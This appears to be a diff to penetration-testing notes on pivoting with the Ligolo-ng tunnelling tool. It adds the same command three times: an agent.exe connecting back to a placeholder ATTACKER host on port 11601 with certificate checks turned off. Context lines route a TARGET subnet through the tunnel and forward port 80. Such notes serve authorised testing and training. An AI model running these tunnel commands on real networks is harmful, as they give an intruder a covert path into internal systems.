@@ -32,4 +32,15 @@ ip route add TARGET/24 dev ligolo
 listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
 ```
 
+```
+agent.exe -connect ATTACKER:11601 -retry -ignore-cert
+```
+
+```
+agent.exe -connect ATTACKER:11601 -retry -ignore-cert
+```
+
+```
+agent.exe -connect ATTACKER:11601 -retry -ignore-cert
+```
 
